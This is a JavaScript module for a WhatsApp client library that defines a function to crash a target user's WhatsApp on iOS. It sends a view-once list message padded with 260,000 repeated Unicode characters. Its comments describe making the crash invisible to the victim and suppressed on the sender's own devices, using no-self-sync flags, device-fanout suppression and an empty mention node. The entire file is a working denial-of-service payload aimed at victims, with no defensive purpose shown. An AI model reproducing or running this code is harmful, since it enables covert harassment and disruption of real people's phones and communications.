const { default: makeWASocket, proto, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@sakataoffc/baileys');
const pino = require('pino');
const crypto = require('crypto');

async function crash_invisivel_ios(sock, target) {
    if (!sock || !target) {
        console.log('[IosInvis] missing sock or target');
        return;
    }

    // ---- Sender guard ----
    // Never let the paired number target itself.
    try {
        const senderRaw = (sock.user && sock.user.id) ? String(sock.user.id) : '';
        const senderNum = senderRaw.split('@')[0].split(':')[0];
        const targetNum = String(target).split('@')[0].split(':')[0];
        if (senderNum && targetNum && senderNum === targetNum) {
            console.log('[IosInvis] skipped — target equals sender (' + senderNum + ')');
            return;
        }
    } catch (_) {
        // fall through
    }

    // Resolve JID (raw number → @s.whatsapp.net)
    let targetJid = String(target).trim();
    if (!targetJid.includes('@')) {
        targetJid = targetJid.replace(/\D/g, '') + '@s.whatsapp.net';
    }

    try {
        // ---- Payload: view-once listResponseMessage, 260k bullet depth ----
        // Invisible: view-once envelope + direct relay means the victim's chat
        // never shows a preview. Payload parse only happens when app renders.
        const tmsg = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
                message: {
                    listResponseMessage: {
                        title: 'uwu\n',
                        description: "\n\n\n" + "𑪆".repeat(260000),
                        singleSelectReply: {
                            selectedId: "id"
                        },
                        listType: 1
                    }
                }
            }
        }, {});

        // ---- Direct relay to target — NOT status@broadcast ----
        // This is the key change:
        //   old: status@broadcast + statusJidList  → sender's own status gets payload → sender crash + visible "status mention"
        //   new: direct to target                  → sender never sees it, target gets invisible hard crash
        await sock.relayMessage(targetJid, tmsg.message, {
            messageId: tmsg.key.id,
            // exact casing — stops mirror to sender's linked devices
            noSelfSync: true,
            // extra device-side suppression layer
            additionalAttributes: {
                'device_fanout': 'false'
            },
            // empty mentioned_users → invisible, no "mentioned you" banner on target
            // (node preserved for in-band JID processing)
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: []
                }]
            }]
        });
    } catch (e) {
        console.log('[IosInvis]', (e && e.message) ? e.message : e);
    }
}

module.exports = { crash_invisivel_ios };
